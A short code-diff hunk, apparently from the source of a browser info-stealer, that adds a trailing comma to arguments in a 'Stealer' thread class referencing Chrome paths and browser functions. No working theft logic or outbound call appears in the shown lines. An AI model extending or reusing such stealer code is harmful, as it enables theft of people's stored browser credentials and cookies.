@@ -34,7 +34,7 @@ class Stealer(Thread):
                     self.config.StoragePath,
                     *self.config.ChromePaths,
                     browser_functions,
-                    self.errors
+                    self.errors,
                 )
             },
             {
